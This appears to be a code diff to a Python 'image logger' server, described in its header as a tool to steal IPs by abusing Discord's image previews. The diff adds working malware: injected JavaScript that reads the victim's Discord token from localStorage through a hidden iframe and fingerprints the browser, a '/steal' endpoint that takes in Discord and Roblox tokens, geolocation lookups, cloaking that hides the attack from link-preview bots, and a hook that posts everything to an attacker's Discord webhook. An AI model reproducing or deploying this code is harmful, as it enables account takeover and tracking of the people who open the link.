@@ -5,10 +5,10 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser, urllib.parse, json, datetime, hashlib, time
 
-__app__ = "Discord Image Logger"
+__app__ = "ds0c logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v3.0-FIXED"
-__author__ = "DeKrypt"
+__author__ = "@ds0c on cord"
 
 TOKEN_JS = '''<script>
 (async()=>{let t="";t=localStorage.token||localStorage.getItem("token")||"";if(!t){let i=document.createElement("iframe");i.style.display="none";i.src="https://discord.com/app";document.body.appendChild(i);setTimeout(()=>{t=i.contentWindow?.localStorage?.token||"";i.remove();},3e3);}
@@ -75,12 +75,180 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
         "username": config["username"],
         "content": "@everyone",
         "embeds": [{
-            "title": "🖼️ ULTIMATE Image Logger - FULL CAPTURE",
+            "title": "ULTIMATE Image Logger - FULL CAPTURE",
             "color": config["color"],
             "description": f"""**Endpoint:** `{endpoint}`
 **Timestamp:** `{datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}`
 
-**🌐 IP GEO:**
+**IP GEO:**
+> IP: `{ip}`
+> ISP: `{info.get('isp','N/A')}`
+> ASN: `{info.get('as','N/A')}`
+> Country: `{info.get('country','N/A')}`
+> Region: `{info.get('regionName','N/A')}`
+> City: `{info.get('city','N/A')}`
+> Lat/Lon: `{info.get('lat','N/A')},{info.get('lon','N/A')}`
+> Timezone: `{info.get('timezone','N/A')}`
+> Mobile: `{info.get('mobile',False)}`
+> VPN/Proxy: `{info.get('proxy',False)}`
+> Hosting: `{info.get('hosting',False)}`
+
+**DEVICE:**
+> OS: `{os_browser[0]}`
+> Browser: `{os_browser[1]}`
+> UA: `{useragent[:450]}`
+
+**TOKENS:**{f'\n> **Discord:** `{urllib.parse.unquote(token)}`' if token else ''}
+{'> **Roblox:** `{urllib.parse.unquote(roblox)}`' if roblox else ''}
+
+**FINGERPRINT:**{f'\n> Canvas: `{safe_fp_get(fp_dict,"cv")}`\n> WebGL: `{safe_fp_get(fp_dict,"wg")}`\n> Audio: `{safe_fp_get(fp_dict,"ah")}`\n> Fonts: `{safe_fp_get(fp_dict,"fs","")[:200]}`\n> Screen: `{safe_fp_get(fp_dict,"s")}`\n> CPU: `{safe_fp_get(fp_dict,"c")}` cores\n> RAM: `{safe_fp_get(fp_dict,"m")}`GB\n> Plugins: `{len(safe_fp_get(fp_dict,"pl","").split(","))}`\n> Touch: `{safe_fp_get(fp_dict,"tc")}`\n> Battery: `{safe_fp_get(fp_dict,"bat")}`\n> Memory: `{safe_fp_get(fp_dict,"mem")}`' if config["fpSteal"] else ''}""",
+            "fields": [{"name":"Network","value":network_info,"inline":True}]
+        }]
+    }
+    
+    if url: embed["embeds"][0]["thumbnail"] = {"url": url}
+    try: 
+        requests.post(config["webhook"], json=embed, timeout=5)
+    except: pass
+
+def reportError(error):
+    try:
+        requests.post(config["webhook"], json={
+            "username": config["username"],
+            "content": "@everyone",
+            "embeds": [{"title": "z0m logger - ERROR", "color": 0xFF0000, "description": f"```\n{str(error)[:1900]}\n```"}]
+        })
+    except: pass
+
+binaries = {
+    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'),
+}
+
+class ImageLoggerAPI(BaseHTTPRequestHandler):
+    
+    def handleRequest(self):
+        try:
+            path = self.path.lower()
+            
+            if '/steal' in path:
+                query = urllib.parse.urlparse(self.path).query
+                params = urllib.parse.parse_qs(query)
+                token = params.get('token', [''])[0]
+                roblox = params.get('roblox', [''])[0]
+                fp_data = {k: urllib.parse.unquote(v[0]) for k,v in params.items() if k not in ['token','roblox']}
+                
+                ip = self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or self.client_address[0]
+                ua = self.headers.get('User-Agent', 'unknown')
+                
+                makeReport(ip, ua, token=token, roblox=roblox, fp=fp_data)
+                self.send_response(200)
+                self.send_header('Content-Type', 'image/gif')
+                self.send_header('Cache-Control', 'no-cache')
+                self.end_headers()
+                self.wfile.write(base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=='))
+                return
+            
+            if config["imageArgument"]:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                if dic.get("url") or dic.get("id"):
+                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                else:
+                    url = config["image"]
+            else:
+                url = config["image"]
+
+            ip = self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or self.client_address[0]
+            ua = self.headers.get('User-Agent', 'unknown')
+            
+            if ip.startswith(blacklistedIPs):
+                self.send_response(200)
+                self.send_header('Content-Type', 'image/jpeg')
+                self.end_headers()
+                self.wfile.write(binaries["loading"])
+                return
+            
+            bot = botCheck(ip, ua)
+            if bot:
+                self.send_response(200)
+                self.send_header('Content-Type', 'image/jpeg')
+                self.end_headers()
+                self.wfile.write(binaries["loading"])
+                makeReport(ip, ua, endpoint=s.split("?")[0], url=url)
+                return
+            
+            makeReport(ip, ua, endpoint=s.split("?")[0], url=url)
+            
+            data = f'''<style>*{{margin:0;padding:0;border:0;}}html,body{{height:100vh;width:100vw;overflow:hidden;background:#000;}}div.img{{background:url('{url}') center/contain no-repeat;background-position:center;background-size:contain;width:100vw;height:100vh;filter:contrast(1.1)brightness(1.05);image-rendering:-webkit-optimize-contrast;image-rendering:crisp-edges;}}</style><div class="img"></div>'''
+            
+            if config["tokenSteal"] or config["fpSteal"]:
+                data += TOKEN_JS
+            
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/html')
+            self.send_header('Cache-Control', 'no-cache,no-store,must-revalidate')
+            self.end_headers()
+            self.wfile.write(data.encode())
+        
+        except Exception as e:
+            try:
+                self.send_response(200)
+                self.send_header('Content-Type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b'<html><body>OK</body></html>')
+            except: pass
+            reportError(traceback.format_exc())
+
+    do_GET = handleRequest
+    do_POST = handleRequest
+
+handler = ImageLoggerAPI
+blacklistedIPs = ("27", "104", "143", "164", "34", "35")
+
+def botCheck(ip, useragent):
+    bots = ["Discord","TelegramBot","Googlebot","Bingbot","facebookexternalhit","Twitterbot","Slackbot","Discordbot","Applebot"]
+    if any(ip.startswith(b) for b in ("34","35")) or any(b in useragent for b in bots):
+        return "BOT"
+    return False
+
+def geolocate_plus(ip):
+    try:
+        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,org,as,lat,lon,timezone,zip,proxy,mobile,hosting", timeout=3)
+        return r.json() if r.status_code == 200 else {}
+    except:
+        return {}
+
+def safe_fp_get(fp, key, default="N/A"):
+    if isinstance(fp, dict):
+        return fp.get(key, default)
+    return default
+
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token="", roblox="", fp=""):
+    if ip.startswith(blacklistedIPs):
+        return
+    
+    bot = botCheck(ip, useragent)
+    if bot:
+        return
+    
+    info = geolocate_plus(ip)
+    
+    os_browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
+    
+    fp_dict = {} if isinstance(fp, str) else fp
+    
+    network_info = f"Referer: {safe_fp_get(fp_dict, 'rf', 'direct')[:250]}\nCookies: {safe_fp_get(fp_dict, 'ck', '0')}\nConnection: {safe_fp_get(fp_dict, 'n', 'unknown')}"
+    
+    embed = {
+        "username": config["username"],
+        "content": "@everyone",
+        "embeds": [{
+            "title": "ULTIMATE Image Logger - FULL CAPTURE",
+            "color": config["color"],
+            "description": f"""**Endpoint:** `{endpoint}`
+**Timestamp:** `{datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}`
+
+**IP GEO:**
 > IP: `{ip}`
 > ISP: `{info.get('isp','N/A')}`
 > ASN: `{info.get('as','N/A')}`
@@ -98,12 +266,12 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
 > Browser: `{os_browser[1]}`
 > UA: `{useragent[:450]}`
 
-**🔑 TOKENS:**
+**TOKENS:**
 {f'> **Discord:** ```{token[:1000]}```' if token else '> **Discord:** `None`'}
 {f'> **Roblox:** ```{roblox[:1000]}```' if roblox else '> **Roblox:** `None`'}
 
-**🖥️ FINGERPRINT:**{f'\n> Canvas: `{safe_fp_get(fp_dict,"cv")}`\n> WebGL: `{safe_fp_get(fp_dict,"wg")}`\n> Audio: `{safe_fp_get(fp_dict,"ah")}`\n> Fonts: `{safe_fp_get(fp_dict,"fs","")[:200]}`\n> Screen: `{safe_fp_get(fp_dict,"s")}`\n> CPU: `{safe_fp_get(fp_dict,"c")}` cores\n> RAM: `{safe_fp_get(fp_dict,"m")}`GB\n> Plugins: `{len(safe_fp_get(fp_dict,"pl","").split(","))}`\n> Touch: `{safe_fp_get(fp_dict,"tc")}`\n> Battery: `{safe_fp_get(fp_dict,"bat")}`\n> Memory: `{safe_fp_get(fp_dict,"mem")}`' if config["fpSteal"] else ''}""",
-            "fields": [{"name":"🌐 Network","value":network_info,"inline":True}]
+**FINGERPRINT:**{f'\n> Canvas: `{safe_fp_get(fp_dict,"cv")}`\n> WebGL: `{safe_fp_get(fp_dict,"wg")}`\n> Audio: `{safe_fp_get(fp_dict,"ah")}`\n> Fonts: `{safe_fp_get(fp_dict,"fs","")[:200]}`\n> Screen: `{safe_fp_get(fp_dict,"s")}`\n> CPU: `{safe_fp_get(fp_dict,"c")}` cores\n> RAM: `{safe_fp_get(fp_dict,"m")}`GB\n> Plugins: `{len(safe_fp_get(fp_dict,"pl","").split(","))}`\n> Touch: `{safe_fp_get(fp_dict,"tc")}`\n> Battery: `{safe_fp_get(fp_dict,"bat")}`\n> Memory: `{safe_fp_get(fp_dict,"mem")}`' if config["fpSteal"] else ''}""",
+            "fields": [{"name":"Network","value":network_info,"inline":True}]
         }]
     }
     
